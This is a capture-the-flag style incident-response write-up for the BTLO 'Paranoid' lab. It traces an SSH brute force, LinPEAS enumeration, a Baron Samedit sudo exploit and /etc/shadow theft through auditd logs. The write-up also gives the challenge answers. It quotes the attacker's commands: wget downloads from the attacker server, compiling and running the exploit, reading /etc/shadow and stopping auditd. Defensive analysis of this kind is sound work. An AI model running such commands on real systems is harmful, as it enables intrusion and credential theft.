---
layout: lab
title: Paranoid
platform: BTLO
difficulty: Medium
category: Incident Response
skill: Incident Response
tools: aureport
tactics:
mitre: "[T1110.001, T1046, T1059.004, T1068, T1005, T1070.002]"
proof: https://blueteamlabs.online/achievement/share/challenge/144656/30
challenge_url: https://blueteamlabs.online/home/challenge/paranoid-e5e164befb
permalink: /blue-team/labs/paranoid/
summary: '"Analysis of Linux auditd logs revealing an SSH brute force attack against a local account, followed by post-exploitation enumeration via LinPEAS, privilege escalation using a compiled CVE-2021-3156 (Baron Samedit) exploit, and exfiltration of /etc/shadow before the attacker cleaned up their tracks."'
art: https://d2ghw05x0obr70.cloudfront.net/thumbnails/8aa05047966639cf91688bbf0dafcc4c479f846a.png
type: challenge
points:
youtube:
locked: tate
---
## Overview

An 83,000-line `audit.log` file is provided for analysis. The investigation centres on identifying how an attacker gained initial access, how they escalated privileges, and what they took on the way out. The primary tool for parsing Linux auditd logs is `aureport`, which translates dense key=value records into readable reports.

---

## Investigation

### Scoping the Incident

The first step is getting a summary of the log to understand what event types are present:

```bash
aureport -if audit.log --summary
```

The output immediately tells a story — **87 failed logins** against a single successful one, **89 failed authentications**, and a 6-minute window covering the entire incident from `05/10/21 11:22:07` to `11:28:06`. Over 100 unique executables and 192 commands confirm significant post-exploitation activity.

### Initial Access — SSH Brute Force

Pulling the failed login report:

```bash
aureport -if audit.log --login --failed
```

All failures originate from `192[.]168[.]4[.]155`, targeting the `btlo` account via SSH. After 87 failed attempts the attacker eventually succeeded, with the successful login recorded at `11:23:16`:

```bash
aureport -if audit.log --login --success
```

The compromised account is confirmed as `btlo` (UID 1001), visible in USER_AUTH events:

```zsh
grep -aoP 'acct="[^"]+"' audit.log | sort -u
```

### Post-Exploitation Enumeration — LinPEAS

With a foothold established, the attacker immediately pulled down LinPEAS from their own HTTP server:

```zsh
grep -a "linpeas" audit.log
```
```
a0="wget" a1="-O" a2="-" a3="hxxp[://]192[.]168[.]4[.]155:8000/linpeas.sh"
````

The characteristic LinPEAS execution signature is visible in the EXECVE records — thousands of calls to `grep`, `sed`, `cut`, `awk`, `find`, `id`, `env`, and `whoami` in rapid succession, along with a massive `find` sweep hunting for credential files, config files, SSH keys, and database configs across the filesystem.

### Privilege Escalation — CVE-2021-3156 (Baron Samedit)

After enumeration, the attacker downloaded a pre-packaged exploit archive from their HTTP server, compiled it on the box, and executed it:

```zsh
grep -a "evil" audit.log
```

The full attack chain is visible in the logs:
```
wget http://192.168.4.155:8000/evil.tar.gz
tar zxvf evil.tar.gz
gcc -o evil hax.c
./evil 0
```

The binary `evil` was compiled from `hax.c` — a PoC for **CVE-2021-3156**, also known as Baron Samedit. This is a heap-based buffer overflow in `sudo`'s argument handling, triggerable via `sudoedit`. It affects sudo versions prior to 1.9.5p2 and allows any local user to gain full root privileges without requiring a password. The SYSCALL record confirms execution under `auid=1001` (btlo) with `pid=829992`.

### Exfiltration

With root access achieved, the attacker read `/etc/shadow` — the hashed password file readable only by root:
```
a0="cat" a1="/etc/shadow"
```

This provides offline cracking material for all local accounts on the system.

### Anti-Forensics — Cleanup

Before disconnecting, the attacker removed all traces of the exploit:
```zsh
rm -rf /home/btlo/evil
rm /home/btlo/evil.tar.gz
````

The attacker also issued `service auditd stop` (decoded from hex in the USER_CMD records) in an attempt to halt further logging.

---

## IOCs

|Type|Value|
|---|---|
|IP — Attacker|`192[.]168[.]4[.]155`|
|Compromised Account|`btlo`|
|Attacker HTTP Server|`hxxp[://]192[.]168[.]4[.]155:8000`|
|Enumeration Tool|`linpeas.sh`|
|Exploit Archive|`evil.tar.gz`|
|Exploit Binary|`/home/btlo/evil/evil`|
|Exploit Source|`hax.c`|
|CVE|CVE-2021-3156|
|Exfiltrated File|`/etc/shadow`|


---

<div class="qa-item"> <div class="qa-question-text">What account was compromised?</div> <div class="flag-reveal"> <input type="checkbox"> <span class="r-placeholder">Click flag to reveal</span> <span class="r-answer">btlo</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">What attack type was used to gain initial access?</div> <div class="answer-reveal"> <input type="checkbox"> <span class="r-placeholder">Click to reveal answer</span> <span class="r-answer">brute force</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">What is the attacker's IP address?</div> <div class="flag-reveal"> <input type="checkbox"> <span class="r-placeholder">Click flag to reveal</span> <span class="r-answer">192.168.4.155</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">What tool was used to perform system enumeration?</div> <div class="answer-reveal"> <input type="checkbox"> <span class="r-placeholder">Click to reveal answer</span> <span class="r-answer">linpeas</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">What is the name of the binary and pid used to gain root?</div> <div class="flag-reveal"> <input type="checkbox"> <span class="r-placeholder">Click flag to reveal</span> <span class="r-answer">evil, 829992</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">What CVE was exploited to gain root access?</div> <div class="answer-reveal"> <input type="checkbox"> <span class="r-placeholder">Click to reveal answer</span> <span class="r-answer">CVE-2021-3156</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">What type of vulnerability is this?</div> <div class="flag-reveal"> <input type="checkbox"> <span class="r-placeholder">Click flag to reveal</span> <span class="r-answer">heap-based buffer overflow</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>

<div class="qa-item"> <div class="qa-question-text">What file was exfiltrated once root was gained?</div> <div class="answer-reveal"> <input type="checkbox"> <span class="r-placeholder">Click to reveal answer</span> <span class="r-answer">/etc/shadow</span> <button class="copy-btn" onclick="event.stopPropagation();navigator.clipboard.writeText(this.previousElementSibling.textContent);this.textContent='copied';setTimeout(()=>this.textContent='copy',1500)">copy</button> </div> </div>
